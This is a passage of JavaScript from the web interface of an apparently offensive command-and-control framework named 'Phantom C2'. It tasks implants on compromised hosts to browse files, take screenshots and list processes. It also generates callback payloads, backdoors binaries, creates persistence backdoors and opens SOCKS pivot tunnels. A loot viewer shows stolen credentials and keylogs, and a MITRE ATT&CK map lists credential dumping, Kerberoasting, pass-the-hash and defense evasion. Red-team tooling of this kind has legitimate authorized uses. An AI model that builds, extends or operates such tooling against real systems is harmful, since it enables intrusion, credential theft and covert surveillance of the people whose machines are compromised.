    const resp = await fetch('/api/filebrowser?agent='+encodeURIComponent(agent)+'&path='+encodeURIComponent(path));
    const data = await resp.json();
    if (data.error) { output.textContent = 'Error: ' + data.error; return; }
    output.innerHTML = '<span style="color:var(--green)">Task queued (ID: '+data.task_id.substring(0,8)+')</span>\n\nWaiting for agent check-in...\nResults will appear below.';

    // Poll for result
    for (let i = 0; i < 20; i++) {
      await new Promise(r => setTimeout(r, 3000));
      const detail = await fetchJ('/api/agent/' + agent);
      if (detail.tasks && detail.tasks.length > 0) {
        const task = detail.tasks.find(t => data.task_id.startsWith(t.id) || t.id.startsWith(data.task_id.substring(0,8)));
        if (task && task.output && task.status !== 'pending' && task.status !== 'sent') {
          const parsed = parseDirOutput(task.output, path);
          output.innerHTML = '<div style="margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid var(--border);">' +
            '<span style="color:var(--green);font-weight:600;">' + cmdLabel + '</span>' +
            '<span style="color:var(--text-muted);font-size:11px;margin-left:12px;">Click folders to navigate</span></div>' + parsed;
          return;
        }
      }
    }
    output.innerHTML += '\n\nTimeout - check agent tasks.';
  } catch(e) { output.textContent = 'Error: ' + e.message; }
}

function browseDir(path) {
  document.getElementById('fb-path').value = path;
  browseFiles();
}

async function requestScreenshot() {
  const agent = getSelectedFBAgent(); if (!agent) return;
  const output = document.getElementById('ss-output');
  output.innerHTML = '<div style="text-align:center;color:var(--accent-light);padding:20px;">📸 Screenshot requested...<br><br>Waiting for agent check-in.<br>Result will appear in agent task history.</div>';

  try {
    const resp = await fetch('/api/screenshot?agent='+encodeURIComponent(agent));
    const data = await resp.json();
    if (data.error) { output.innerHTML = '<div style="color:var(--red);padding:20px;">'+data.error+'</div>'; return; }
    output.innerHTML = '<div style="text-align:center;padding:20px;"><div style="color:var(--green);margin-bottom:8px;">Screenshot task queued</div><div style="color:var(--text-muted);font-size:12px;">ID: '+data.task_id.substring(0,8)+'<br>Check agent detail for the captured image.</div></div>';
  } catch(e) { output.innerHTML = '<div style="color:var(--red);">'+e.message+'</div>'; }
}

async function requestProcessList() {
  const agent = getSelectedFBAgent(); if (!agent) return;
  const output = document.getElementById('ps-output');
  output.textContent = 'Requesting process list...';

  try {
    const resp = await fetch('/api/processlist?agent='+encodeURIComponent(agent));
    const data = await resp.json();
    if (data.error) { output.textContent = 'Error: ' + data.error; return; }
    output.innerHTML = '<span style="color:var(--green)">Task queued (ID: '+data.task_id.substring(0,8)+')</span>\n\nWaiting for agent...';

    for (let i = 0; i < 20; i++) {
      await new Promise(r => setTimeout(r, 3000));
      const detail = await fetchJ('/api/agent/' + agent);
      if (detail.tasks && detail.tasks.length > 0) {
        const task = detail.tasks.find(t => data.task_id.startsWith(t.id) || t.id.startsWith(data.task_id.substring(0,8)));
        if (task && task.output && task.status !== 'pending' && task.status !== 'sent') {
          output.innerHTML = '<span style="color:var(--green)">$ ps aux</span>\n\n' + task.output;
          return;
        }
      }
    }
    output.innerHTML += '\n\nTimeout - check agent tasks.';
  } catch(e) { output.textContent = 'Error: ' + e.message; }
}

async function addNote() {
  const agent = getSelectedFBAgent(); if (!agent) return;
  const input = document.getElementById('note-input');
  const text = input.value.trim();
  if (!text) return;

  await fetch('/api/notes?agent='+encodeURIComponent(agent), {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({text: text})
  });
  input.value = '';
  loadNotes(agent);
}

async function loadNotes(agent) {
  const list = document.getElementById('notes-list');
  try {
    const notes = await fetchJ('/api/notes?agent='+encodeURIComponent(agent));
    if (!notes || notes.length === 0) {
      list.innerHTML = '<div style="color:var(--text-muted);font-size:12px;padding:8px;">No notes yet.</div>';
      return;
    }
    list.innerHTML = notes.map(n =>
      '<div style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;margin-bottom:6px;">'+
      '<div style="display:flex;justify-content:space-between;font-size:11px;color:var(--text-muted);margin-bottom:4px;">'+
      '<span style="color:var(--accent-light);font-weight:600;">'+n.author+'</span>'+
      '<span>'+n.timestamp+'</span></div>'+
      '<div style="font-size:13px;">'+n.text+'</div></div>'
    ).join('');
  } catch(e) { list.innerHTML = '<div style="color:var(--red);">'+e.message+'</div>'; }
}

async function searchOutput() {
  const query = document.getElementById('search-input').value.trim();
  if (!query) return;
  const results = document.getElementById('search-results');
  results.innerHTML = '<div style="color:var(--text-muted);padding:8px;">Searching...</div>';

  try {
    const data = await fetchJ('/api/search?q='+encodeURIComponent(query));
    if (!data || data.length === 0) {
      results.innerHTML = '<div style="color:var(--text-muted);padding:8px;">No results found for "'+query+'"</div>';
      return;
    }
    results.innerHTML = data.map(r =>
      '<div style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;margin-bottom:6px;">'+
      '<div style="display:flex;justify-content:space-between;font-size:11px;margin-bottom:4px;">'+
      '<span style="color:var(--accent-light);font-weight:600;">'+r.agent+'</span>'+
      '<span style="color:var(--text-muted);">'+r.type+' | '+r.time+'</span></div>'+
      '<div style="font-size:12px;color:var(--cyan);margin-bottom:4px;font-family:monospace;">$ '+r.command+'</div>'+
      '<div style="font-size:12px;font-family:monospace;color:var(--text-primary);max-height:100px;overflow-y:auto;white-space:pre-wrap;">'+r.output+'</div></div>'
    ).join('');
  } catch(e) { results.innerHTML = '<div style="color:var(--red);">'+e.message+'</div>'; }
}

// Update file browser agent selector on refresh
function updateFBAgentSelector(agents) {
  window._cachedAgents = agents;
  const sel = document.getElementById('fb-agent');
  if (!sel) return;
  const cur = sel.value;
  sel.innerHTML = '<option value="">Select an agent...</option>' + agents.map(a =>
    '<option value="'+a.name+'" '+(a.name===cur?'selected':'')+'>'+a.name+' ('+a.os+' / '+a.hostname+')</option>'
  ).join('');

  // Update OS-specific buttons if agent selected
  if (sel.value) {
    fbCurrentOS = getAgentOS(sel.value);
    updateFBQuickButtons();
    loadNotes(sel.value);
  }
}

document.getElementById('fb-agent').addEventListener('change', function() {
  if (this.value) {
    fbCurrentOS = getAgentOS(this.value);
    updateFBQuickButtons();
    loadNotes(this.value);
  }
});

// ──── Listener Management ────
async function startListener(name) {
  try {
    const resp = await fetch('/api/listener/start?name='+encodeURIComponent(name));
    const data = await resp.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    refreshAll();
  } catch(e) { alert('Error: ' + e.message); }
}

async function stopListener(name) {
  if (!confirm('Stop listener "'+name+'"?')) return;
  try {
    const resp = await fetch('/api/listener/stop?name='+encodeURIComponent(name));
    const data = await resp.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    refreshAll();
  } catch(e) { alert('Error: ' + e.message); }
}

async function createListener(savePreset) {
  const name = document.getElementById('ln-name').value.trim();
  const typ = document.getElementById('ln-type').value;
  const bind = document.getElementById('ln-bind').value.trim();
  const profile = document.getElementById('ln-profile').value;
  if (!name || !bind) { alert('Name and bind address are required'); return; }

  try {
    const resp = await fetch('/api/listener/create', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({name:name, type:typ, bind:bind, profile:profile, save:savePreset})
    });
    const data = await resp.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    document.getElementById('ln-name').value = '';
    document.getElementById('ln-bind').value = '';
    refreshAll();
  } catch(e) { alert('Error: ' + e.message); }
}

async function savePresetOnly() {
  const name = document.getElementById('ln-name').value.trim();
  const typ = document.getElementById('ln-type').value;
  const bind = document.getElementById('ln-bind').value.trim();
  const profile = document.getElementById('ln-profile').value;
  if (!name || !bind) { alert('Name and bind address are required'); return; }

  try {
    const resp = await fetch('/api/presets', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({action:'save', name:name, type:typ, bind:bind, profile:profile})
    });
    const data = await resp.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    document.getElementById('ln-name').value = '';
    document.getElementById('ln-bind').value = '';
    loadPresets();
  } catch(e) { alert('Error: ' + e.message); }
}

async function loadPresets() {
  const container = document.getElementById('presets-list');
  if (!container) return;
  try {
    const presets = await fetchJ('/api/presets');
    window._cachedPresets = presets;
    populateListenerSelector();
    populateBackdoorListeners();
    if (!presets || presets.length === 0) {
      container.innerHTML = '<div style="color:var(--text-muted);font-size:13px;padding:12px;text-align:center;">No saved presets.<br><span style="font-size:11px;">Create a listener and save it as a preset for quick reuse.</span></div>';
      return;
    }
    container.innerHTML = presets.map(p =>
      '<div style="display:flex;align-items:center;justify-content:space-between;padding:10px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:8px;margin-bottom:6px;">' +
      '<div>' +
        '<div style="font-weight:600;font-size:13px;color:var(--text-primary);">'+p.name+'</div>' +
        '<div style="font-size:11px;color:var(--text-muted);font-family:monospace;">'+p.type.toUpperCase()+' · '+p.bind+' · '+p.profile+'</div>' +
      '</div>' +
      '<div style="display:flex;gap:6px;">' +
        '<button class="qbtn" onclick="usePreset(\''+p.name+'\')" style="padding:5px 12px;font-size:11px;background:rgba(124,58,237,0.15);color:var(--accent-light);">🚀 Launch</button>' +
        '<button class="qbtn" onclick="deletePreset(\''+p.name+'\')" style="padding:5px 8px;font-size:11px;color:#ef4444;">✕</button>' +
      '</div></div>'
    ).join('');
  } catch(e) { container.innerHTML = '<div style="color:var(--red);">'+e.message+'</div>'; }
}

async function usePreset(name) {
  try {
    const resp = await fetch('/api/presets', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({action:'use', name:name})
    });
    const data = await resp.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    refreshAll();
  } catch(e) { alert('Error: ' + e.message); }
}

async function deletePreset(name) {
  if (!confirm('Delete preset "'+name+'"?')) return;
  try {
    const resp = await fetch('/api/presets', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({action:'delete', name:name})
    });
    const data = await resp.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    loadPresets();
  } catch(e) { alert('Error: ' + e.message); }
}

// ──── Payload Generator ────
function populateListenerSelector() {
  const sel = document.getElementById('pl-listener-select');
  if (!sel) return;
  const cur = sel.value;
  let opts = '<option value="">-- Select a listener or preset --</option>';

  // Add running listeners
  if (window._cachedListeners && window._cachedListeners.length > 0) {
    opts += '<optgroup label="Active Listeners">';
    window._cachedListeners.forEach(l => {
      if (l.status === 'running') {
        const proto = l.type === 'HTTPS' ? 'https' : 'http';
        const url = proto + '://' + l.bind;
        opts += '<option value="'+url+'">'+l.name+' ('+url+')</option>';
      }
    });
    opts += '</optgroup>';
  }

  // Add presets
  if (window._cachedPresets && window._cachedPresets.length > 0) {
    opts += '<optgroup label="Saved Presets">';
    window._cachedPresets.forEach(p => {
      const proto = p.type === 'https' ? 'https' : 'http';
      const url = proto + '://' + p.bind;
      opts += '<option value="'+url+'">💾 '+p.name+' ('+url+')</option>';
    });
    opts += '</optgroup>';
  }

  sel.innerHTML = opts;
  if (cur) sel.value = cur;
}

function onListenerSelect() {
  const sel = document.getElementById('pl-listener-select');
  if (sel.value) {
    document.getElementById('pl-url').value = sel.value;
  }
}

function onPayloadTypeChange() {
  const type = document.getElementById('pl-type').value;
  const appRow = document.getElementById('pl-app-row');
  if (type === 'app') {
    appRow.style.display = 'block';
    loadAppTemplates();
  } else {
    appRow.style.display = 'none';
  }
}

async function loadAppTemplates() {
  const sel = document.getElementById('pl-app-template');
  try {
    const templates = await fetchJ('/api/payload/apps');
    sel.innerHTML = templates.map(t =>
      '<option value="'+t.name+'">'+t.icon+' '+t.display+' ('+t.category+', '+t.perms+' perms)</option>'
    ).join('');
  } catch(e) {
    sel.innerHTML = '<option>Failed to load templates</option>';
  }
}

async function loadPayloadHistory() {
  const table = document.getElementById('payload-history-table');
  if (!table) return;
  try {
    const history = await fetchJ('/api/payload/history');
    if (!history || history.length === 0) {
      table.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--text-muted);padding:20px">No payloads generated yet</td></tr>';
      return;
    }
    table.innerHTML = history.slice().reverse().map(p =>
      '<tr><td style="color:var(--accent-light);font-size:11px">'+p.id+'</td>' +
      '<td style="color:var(--cyan)">'+p.type+'</td>' +
      '<td style="font-family:monospace;font-size:11px">'+p.filename+'</td>' +
      '<td>'+p.size+'</td>' +
      '<td style="font-size:11px;color:var(--text-muted)">'+p.listener+'</td>' +
      '<td style="font-size:11px;color:var(--text-muted)">'+p.created_at+'</td>' +
      '<td><a href="/api/payload/download?file='+encodeURIComponent(p.filepath)+'" class="qbtn" style="font-size:11px;padding:4px 10px;text-decoration:none">⬇ Download</a></td></tr>'
    ).join('');
  } catch(e) {}
}

async function generatePayload() {
  const btn = document.getElementById('pl-btn');
  const output = document.getElementById('pl-output');
  const type = document.getElementById('pl-type').value;
  const url = document.getElementById('pl-url').value;
  const sleep = parseInt(document.getElementById('pl-sleep').value) || 10;
  const jitter = parseInt(document.getElementById('pl-jitter').value) || 20;
  const appTemplate = document.getElementById('pl-app-template').value;

  btn.textContent = 'Generating...';
  btn.disabled = true;
  output.innerHTML = '<div style="text-align:center;padding:40px;color:var(--accent-light);">Generating payload...</div>';

  try {
    const resp = await fetch('/api/payload/generate', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        type: type,
        listener_url: url,
        sleep: sleep,
        jitter: jitter,
        app_template: appTemplate
      })
    });
    const data = await resp.json();

    if (data.success) {
      let details = '<div style="color:var(--green);font-weight:600;font-size:14px;margin-bottom:12px;">Payload Generated Successfully</div>';
      if (data.filename) details += '<div style="margin-bottom:6px;"><span style="color:var(--text-muted);font-size:11px;">FILE:</span> <code style="color:var(--accent-light);">'+data.filename+'</code></div>';
      if (data.filepath) details += '<div style="margin-bottom:6px;"><span style="color:var(--text-muted);font-size:11px;">PATH:</span> <code style="color:var(--text-primary);">'+data.filepath+'</code></div>';
      if (data.size) details += '<div style="margin-bottom:6px;"><span style="color:var(--text-muted);font-size:11px;">SIZE:</span> <span style="color:var(--blue);">'+data.size+'</span></div>';
      details += '<div style="margin-bottom:6px;"><span style="color:var(--text-muted);font-size:11px;">TYPE:</span> <span>'+data.type+'</span></div>';
      details += '<div style="margin-bottom:6px;"><span style="color:var(--text-muted);font-size:11px;">CALLBACK:</span> <span>'+url+'</span></div>';

      // Download button
      if (data.filepath) {
        details += '<div style="margin-top:12px;"><a href="/api/payload/download?file='+encodeURIComponent(data.filepath)+'" class="btn" style="text-decoration:none;display:inline-block;padding:10px 20px;">Download '+( data.filename || 'Payload' )+'</a></div>';
      }

      if (data.message) {
        details += '<div style="margin-top:12px;padding:10px;background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.2);border-radius:6px;font-size:12px;color:var(--green);white-space:pre-wrap;">'+data.message+'</div>';
      }
      output.innerHTML = details;

      // Refresh payload history
      loadPayloadHistory();
    } else {
      output.innerHTML = '<div style="color:var(--red);font-weight:600;">Generation Failed</div><div style="margin-top:8px;color:var(--text-muted);font-size:12px;">'+data.message+'</div>';
    }
  } catch(e) {
    output.innerHTML = '<div style="color:var(--red);">Error: '+e.message+'</div>';
  }

  btn.textContent = 'Generate Payload';
  btn.disabled = false;
}

// ──── SOCKS Tunnel ────
async function startTunnel() {
  const agent = document.getElementById('agent-select').value;
  if (!agent) { alert('Select an agent first'); return; }
  const port = prompt('SOCKS5 bind port on YOUR machine (default: 1080):', '1080');
  if (!port) return;
  const bind = '127.0.0.1:' + port;
  try {
    const resp = await fetch('/api/tunnel/start', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({agent:agent, bind:bind})
    });
    const data = await resp.json();
    if (data.error) { termLog('error', 'Tunnel error: ' + data.error); return; }
    termLog('success', data.message);
    termLog('info', 'Proxychains config: socks5 127.0.0.1 ' + port);
    termLog('info', 'Usage: proxychains nmap -sT -Pn <target_network>');
  } catch(e) { termLog('error', 'Tunnel failed: ' + e.message); }
}

async function stopTunnel() {
  const agent = document.getElementById('agent-select').value;
  if (!agent) { alert('Select an agent first'); return; }
  try {
    await fetch('/api/tunnel/stop?agent=' + encodeURIComponent(agent));
    termLog('info', 'SOCKS tunnel stopped for ' + agent);
  } catch(e) { termLog('error', e.message); }
}

// ──── Binary Backdoor ────
async function backdoorBinary() {
  const input = document.getElementById('bd-input').value.trim();
  const url = document.getElementById('bd-url').value.trim();
  const output = document.getElementById('bd-output').value.trim();
  const result = document.getElementById('bd-result');

  if (!input || !url) { alert('Input binary path and listener URL are required'); return; }

  result.innerHTML = '<span style="color:var(--yellow)">Backdooring binary...</span>';

  try {
    const resp = await fetch('/api/payload/backdoor/binary', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({input:input, listener_url:url, output:output||''})
    });
    const data = await resp.json();
    if (data.error) {
      result.innerHTML = '<span style="color:var(--red)">Error: '+data.error+'</span>';
    } else {
      result.innerHTML = '<span style="color:var(--green)">Backdoored! '+data.filepath+' ('+data.size+')</span>' +
        '<br><a href="/api/payload/download?file='+encodeURIComponent(data.filepath)+'" style="color:var(--cyan);font-size:12px">Download</a>';
    }
  } catch(e) { result.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
}

async function generatePersistBackdoor() {
  const type = document.getElementById('bd-type').value;
  const url = document.getElementById('bd-persist-url').value.trim();
  const app = document.getElementById('bd-target-app').value.trim();
  const result = document.getElementById('bd-persist-result');

  if (!url) { alert('Listener URL required'); return; }

  result.innerHTML = '<span style="color:var(--yellow)">Generating...</span>';

  try {
    const resp = await fetch('/api/payload/backdoor', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({type:type, listener_url:url, target_app:app})
    });
    const data = await resp.json();
    if (data.error) {
      result.innerHTML = '<span style="color:var(--red)">Error: '+data.error+'</span>';
    } else {
      result.innerHTML = '<span style="color:var(--green)">Generated: '+data.filepath+'</span>' +
        '<br><a href="/api/payload/download?file='+encodeURIComponent(data.filepath)+'" style="color:var(--cyan);font-size:12px">Download</a>';
    }
  } catch(e) { result.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
}

// Populate backdoor listener selectors
function populateBackdoorListeners() {
  const sel = document.getElementById('bd-listener');
  if (!sel) return;
  let opts = '<option value="">-- Select listener --</option>';
  if (window._cachedListeners) {
    window._cachedListeners.forEach(l => {
      if (l.status === 'running') {
        const proto = l.type === 'HTTPS' ? 'https' : 'http';
        const url = proto + '://' + l.bind;
        opts += '<option value="'+url+'">'+l.name+' ('+url+')</option>';
      }
    });
  }
  if (window._cachedPresets) {
    window._cachedPresets.forEach(p => {
      const proto = p.type === 'https' ? 'https' : 'http';
      const url = proto + '://' + p.bind;
      opts += '<option value="'+url+'">'+p.name+' ('+url+')</option>';
    });
  }
  sel.innerHTML = opts;
}

document.getElementById('bd-listener').addEventListener('change', function() {
  if (this.value) document.getElementById('bd-url').value = this.value;
});

// ──── Pivot Graph (Canvas) ────
function drawPivotGraph() {
  const canvas = document.getElementById('pivot-canvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  canvas.width = canvas.offsetWidth * 2;
  canvas.height = 500 * 2;
  ctx.scale(2, 2);
  const W = canvas.offsetWidth, H = 500;
  ctx.clearRect(0, 0, W, H);

  if (!window._cachedAgents || window._cachedAgents.length === 0) {
    ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--text-muted');
    ctx.font = '14px "Segoe UI", sans-serif';
    ctx.textAlign = 'center';
    ctx.fillText('No agents connected — deploy agents to see the pivot map', W/2, H/2);
    return;
  }

  const agents = window._cachedAgents;
  const c2x = W/2, c2y = 50;
  const accent = getComputedStyle(document.documentElement).getPropertyValue('--accent-light').trim() || '#a78bfa';
  const green = '#10b981', red = '#ef4444', yellow = '#f59e0b', muted = '#5a6580';
  const textColor = getComputedStyle(document.documentElement).getPropertyValue('--text-primary').trim() || '#e8ecf4';

  // Draw C2 server
  ctx.fillStyle = accent;
  ctx.beginPath(); ctx.arc(c2x, c2y, 22, 0, Math.PI*2); ctx.fill();
  ctx.fillStyle = '#fff'; ctx.font = '16px sans-serif'; ctx.textAlign = 'center'; ctx.fillText('C2', c2x, c2y+5);
  ctx.fillStyle = textColor; ctx.font = '10px sans-serif'; ctx.fillText('Phantom C2', c2x, c2y+38);

  // Group agents by network
  const networks = {};
  agents.forEach(a => {
    const ip = a.ip || '0.0.0.0';
    const net = ip.split('.').slice(0,3).join('.') + '.0/24';
    if (!networks[net]) networks[net] = [];
    networks[net].push(a);
  });

  const netKeys = Object.keys(networks);
  const netSpacing = W / (netKeys.length + 1);

  netKeys.forEach((net, ni) => {
    const nx = netSpacing * (ni + 1);
    const ny = 140;

    // Network label
    ctx.fillStyle = yellow;
    ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
    ctx.fillText(net, nx, ny - 10);

    // Network box
    const boxH = Math.max(120, networks[net].length * 70 + 30);
    ctx.strokeStyle = muted; ctx.lineWidth = 1; ctx.setLineDash([4,4]);
    ctx.strokeRect(nx - 80, ny, 160, boxH);
    ctx.setLineDash([]);

    // Line from C2 to network
    ctx.strokeStyle = accent; ctx.lineWidth = 1.5;
    ctx.beginPath(); ctx.moveTo(c2x, c2y+22); ctx.lineTo(nx, ny); ctx.stroke();

    // Agents in network
    networks[net].forEach((a, ai) => {
      const ax = nx, ay = ny + 35 + ai * 65;
      const color = a.status === 'active' ? green : red;

      // Agent node
      ctx.fillStyle = color;
      ctx.beginPath(); ctx.arc(ax, ay, 16, 0, Math.PI*2); ctx.fill();
      ctx.fillStyle = '#fff'; ctx.font = '12px sans-serif'; ctx.textAlign = 'center';
      ctx.fillText(a.os === 'windows' ? 'W' : 'L', ax, ay+4);

      // Agent label
      ctx.fillStyle = textColor; ctx.font = 'bold 10px sans-serif';
      ctx.fillText(a.name, ax, ay + 30);
      ctx.fillStyle = muted; ctx.font = '9px monospace';
      ctx.fillText(a.ip + ' | ' + a.hostname, ax, ay + 42);
    });
  });
}

// ──── IOC Dashboard ────
function updateIOC() {
  if (!window._cachedAgents) return;
  const agents = window._cachedAgents;

  // Files dropped (agents deployed)
  const files = document.getElementById('ioc-files');
  if (files) {
    files.innerHTML = agents.map(a =>
      '<div style="padding:4px 0;border-bottom:1px solid var(--border)">' +
      '<span style="color:var(--red)">'+a.hostname+'</span>: /tmp/agent <span style="color:var(--text-muted)">(Phantom implant)</span></div>'
    ).join('') || '<div style="color:var(--text-muted)">No files tracked</div>';
  }

  // Network connections (callbacks)
  const network = document.getElementById('ioc-network');
  if (network) {
    network.innerHTML = agents.map(a =>
      '<div style="padding:4px 0;border-bottom:1px solid var(--border)">' +
      '<span style="color:var(--cyan)">'+a.ip+'</span> → 172.20.41.154:8080 <span style="color:var(--text-muted)">(HTTP C2 beacon, '+a.sleep+')</span></div>'
    ).join('') || '<div style="color:var(--text-muted)">No connections tracked</div>';
  }

  // Processes
  const procs = document.getElementById('ioc-procs');
  if (procs) {
    procs.innerHTML = agents.map(a =>
      '<div style="padding:4px 0;border-bottom:1px solid var(--border)">' +
      '<span style="color:var(--yellow)">'+a.hostname+'</span>: /tmp/agent <span style="color:var(--text-muted)">(PID unknown, '+(a.os==='windows'?'cmd.exe':'/bin/sh')+' child)</span></div>'
    ).join('') || '<div style="color:var(--text-muted)">No processes tracked</div>';
  }

  // Persistence
  const persist = document.getElementById('ioc-persist');
  if (persist) {
    persist.innerHTML = '<div style="color:var(--text-muted);padding:8px">Persistence artifacts will appear here when agents install persistence mechanisms (cron, registry, etc.)</div>';
  }

  // Update replay agent selector
  const sel = document.getElementById('replay-agent');
  if (sel) {
    const cur = sel.value;
    sel.innerHTML = '<option value="">Select agent...</option>' +
      agents.map(a => '<option value="'+a.name+'" '+(a.name===cur?'selected':'')+'>'+a.name+' ('+a.hostname+')</option>').join('');
  }
}

// ──── Session Replay ────
async function loadReplay() {
  const agent = document.getElementById('replay-agent').value;
  const output = document.getElementById('replay-output');
  if (!agent) { output.textContent = 'Select an agent to replay its session history.'; return; }

  try {
    const detail = await fetchJ('/api/agent/' + agent);
    if (!detail.tasks || detail.tasks.length === 0) {
      output.innerHTML = '<span style="color:var(--text-muted)">No commands executed on this agent yet.</span>';
      return;
    }

    output.innerHTML = detail.tasks.map(t => {
      const cmdColor = t.status === 'complete' ? 'var(--green)' : t.status === 'error' ? 'var(--red)' : 'var(--yellow)';
      let html = '<div style="margin-bottom:12px">';
      html += '<span style="color:var(--text-muted);font-size:10px">['+t.time+']</span> ';
      html += '<span style="color:'+cmdColor+';font-weight:600">'+t.type+'</span> ';
      html += '<span style="color:var(--cyan)">'+t.args+'</span>';
      html += ' <span style="font-size:10px;padding:1px 6px;border-radius:3px;background:'+(t.status==='complete'?'var(--green-dim)':t.status==='error'?'var(--red-dim)':'var(--yellow-dim)')+';color:'+(t.status==='complete'?'var(--green)':t.status==='error'?'var(--red)':'var(--yellow)')+'">'+t.status+'</span>';
      if (t.output) {
        html += '\n<span style="color:var(--text-secondary)">'+t.output.substring(0,500)+'</span>';
      }
      if (t.error) {
        html += '\n<span style="color:var(--red)">Error: '+t.error+'</span>';
      }
      html += '</div>';
      return html;
    }).join('<div style="border-top:1px solid var(--border);margin:4px 0"></div>');
  } catch(e) { output.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
}

// ──── Loot Viewer ────
async function loadLoot() {
  const grid = document.getElementById('loot-grid');
  if (!grid) return;
  grid.innerHTML = '<div style="color:var(--text-muted);padding:20px;text-align:center">Loading loot...</div>';
  try {
    const loot = await fetchJ('/api/loot');
    const filter = document.getElementById('loot-filter').value;
    const filtered = filter === 'all' ? loot : loot.filter(l => l.type === filter);
    if (filtered.length === 0) {
      grid.innerHTML = '<div style="color:var(--text-muted);padding:40px;text-align:center;grid-column:1/-1">No loot collected yet. Execute commands to capture output.</div>';
      return;
    }
    const typeIcons = {credentials:'🔑',file:'📄',screenshot:'📸',keylog:'⌨️',sysinfo:'💻',output:'📋'};
    const typeColors = {credentials:'var(--green)',file:'var(--blue)',screenshot:'var(--cyan)',keylog:'var(--yellow)',sysinfo:'var(--accent-light)',output:'var(--text-muted)'};
    grid.innerHTML = filtered.map(l =>
      '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);overflow:hidden">' +
      '<div style="padding:12px 16px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center">' +
      '<div><span style="font-size:16px">'+( typeIcons[l.type]||'📋')+'</span> <strong style="color:'+(typeColors[l.type]||'var(--text-primary)')+'">'+l.type.toUpperCase()+'</strong></div>' +
      '<div style="font-size:11px;color:var(--text-muted)">'+l.agent+' · '+l.time+'</div></div>' +
      '<div style="padding:8px 16px;font-size:11px;color:var(--text-secondary);font-family:monospace">'+l.command+'</div>' +
      '<pre style="margin:0;padding:12px 16px;font-size:11px;max-height:200px;overflow-y:auto;background:var(--bg-input);border:none;border-radius:0">'+l.output.substring(0,1000)+'</pre>' +
      '<div style="padding:6px 16px;font-size:10px;color:var(--text-muted);border-top:1px solid var(--border)">'+l.size+' bytes</div></div>'
    ).join('');
  } catch(e) { grid.innerHTML = '<div style="color:var(--red);">'+e.message+'</div>'; }
}

// ──── Command Templates ────
async function loadTemplates() {
  const list = document.getElementById('template-list');
  if (!list) return;
  try {
    const templates = await fetchJ('/api/templates');
    list.innerHTML = templates.map((t,i) =>
      '<div style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:14px;margin-bottom:8px">' +
      '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">' +
      '<div><strong style="color:var(--accent-light)">'+t.name+'</strong> <span style="font-size:10px;color:var(--text-muted);background:var(--bg-hover);padding:2px 6px;border-radius:4px;margin-left:6px">'+t.category+'</span></div>' +
      '<button class="qbtn" onclick="runTemplate('+i+')" style="font-size:11px;padding:4px 12px;background:var(--accent-glow);color:var(--accent-light)">Run All</button></div>' +
      '<div style="font-family:monospace;font-size:11px;color:var(--text-secondary);line-height:1.8">' +
      t.commands.map(c => '<div style="padding:2px 0">$ '+c+'</div>').join('') + '</div></div>'
    ).join('');
  } catch(e) { list.innerHTML = '<div style="color:var(--red)">'+e.message+'</div>'; }
}

async function runTemplate(idx) {
  const agent = document.getElementById('agent-select').value;
  if (!agent) { alert('Select an agent in the Terminal tab first'); return; }
  const templates = await fetchJ('/api/templates');
  const t = templates[idx];
  if (!t) return;
  nav('terminal');
  for (const cmd of t.commands) {
    const parts = cmd.split(' ');
    const command = parts[0];
    const args = parts.slice(1).join(' ');
    await fetch('/api/cmd', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agent, command:command, args:args})});
    termLog('system', '→ ' + cmd);
    await new Promise(r => setTimeout(r, 500));
  }
  termLog('success', '✓ Template "'+t.name+'" executed ('+t.commands.length+' commands)');
}

// ──── MITRE ATT&CK Mapping ────
const mitreMap = [
  {id:'T1059',name:'Command & Scripting',commands:['shell','ps']},
  {id:'T1082',name:'System Information',commands:['sysinfo']},
  {id:'T1113',name:'Screen Capture',commands:['screenshot']},
  {id:'T1005',name:'Data from Local System',commands:['download']},
  {id:'T1056.001',name:'Keylogging',commands:['keylog']},
  {id:'T1003',name:'OS Credential Dumping',commands:['creds','ad-dump-sam','ad-dump-lsa']},
  {id:'T1558',name:'Kerberoasting',commands:['ad-kerberoast','ad-asreproast']},
  {id:'T1021',name:'Remote Services',commands:['ad-psexec','ad-wmi','ad-winrm','pivot']},
  {id:'T1134',name:'Access Token Manipulation',commands:['token']},
  {id:'T1547',name:'Boot/Logon Autostart',commands:['persist']},
  {id:'T1572',name:'Protocol Tunneling',commands:['socks','portfwd']},
  {id:'T1562',name:'Impair Defenses',commands:['evasion']},
  {id:'T1557',name:'LLMNR/NBT-NS Poisoning',commands:['ad-pass-the-hash']},
  {id:'T1069',name:'Permission Groups Discovery',commands:['ad-enum-groups','ad-enum-admins']},
  {id:'T1018',name:'Remote System Discovery',commands:['ad-enum-computers']},
